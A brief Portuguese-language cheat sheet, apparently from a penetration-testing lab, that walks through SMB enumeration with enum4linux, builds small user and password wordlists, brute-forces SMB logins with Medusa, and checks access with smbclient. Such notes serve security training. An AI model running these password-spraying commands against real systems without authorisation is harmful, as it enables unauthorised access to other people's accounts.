# Ataque em Cadeia e Enumeração `SMB` (Password Spraying)

## Enumeração

```bash
enum4linux -a (IP ALVO) | tee enum4_output.txt

less enum4_output.txt #para ter acesso ao novo arquivo
```

## Wordlist de usuários

```bash
echo -e "user\nmsfadmin\nservice\nadmin\nroot" > smb_users.txt
```
## Wordlist de senhas

```bash
echo -e "password\n123456\nWelcome123\nmsfadmin\nadmin\nroot" > pass_spray.txt
```

## Bruteforce com `MEDUSA`

```
medusa -h (IP ALVO) -U smb_users.txt -P pass_spray.txt -M smbnt -t 2 -T 50
```

### Verificação de acesso SMB

```bash
smbclient -L //(IP ALVO) -U msfadmin
```
